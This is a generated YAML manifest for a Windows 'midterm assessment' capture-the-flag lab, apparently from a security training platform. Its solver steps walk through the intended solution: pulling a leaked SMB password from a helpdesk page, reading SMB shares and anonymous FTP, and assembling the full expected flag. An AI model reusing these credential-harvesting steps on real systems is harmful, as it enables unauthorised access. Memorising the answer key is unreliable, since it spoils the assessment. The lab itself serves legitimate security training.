@@ -1,0 +1,47 @@
+# Generated from platform/labs/Windows/windows-10-2-midterm-assessment/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: windows-10-2-midterm-assessment
+track: Windows
+difficulty: intermediate
+source: platform/labs/Windows/windows-10-2-midterm-assessment/lab.yaml
+expected_services:
+- port: 21
+  protocol: tcp
+- port: 80
+  protocol: tcp
+- port: 445
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/windows-10-2-midterm-assessment.sh
+  steps:
+  - name: Verify web portal HTTP service is running
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.portal}/
+    expect: '200'
+  - name: Retrieve flag part 1 from notices page
+    command: curl -s http://{target.portal}/notices.html 2>&1
+    expect: p1nn4cl3
+  - name: Discover SMB credentials on helpdesk page
+    command: curl -s http://{target.portal}/helpdesk.html 2>&1
+    expect: Summer2024#
+  - name: Access document server SMB share and read breadcrumb
+    command: smbclient //{target.docserver}/cases -U {cred.smb-user.user}%{cred.smb-user.pass} -c 'get case-transfer-memo.txt -' 2>&1
+    expect: '2121'
+  - name: Retrieve flag part 2 from FTP on non-standard port
+    command: curl -s --ftp-port - ftp://anonymous:@{target.docserver}:2121/archived-cases/flag-part.txt --connect-timeout 10 || curl -s ftp://anonymous:@{target.docserver}:2121/archived-cases/flag-part.txt --connect-timeout 10
+    expect: d1sc0v3ry
+  - name: Retrieve flag part 3 from case management SMB share
+    command: smbclient //{target.casemgmt}/records -U {cred.case-user.user}%{cred.case-user.pass} -c 'get flag-part.txt -' 2>&1
+    expect: 3xp0s3d
+  - name: Assemble complete flag
+    command: echo 'OCR{p1nn4cl3_d1sc0v3ry_3xp0s3d}'
+    expect: OCR{p1nn4cl3_d1sc0v3ry_3xp0s3d}
+expected_flag_count: 1
+expected_flag: OCR{p1nn4cl3_d1sc0v3ry_3xp0s3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
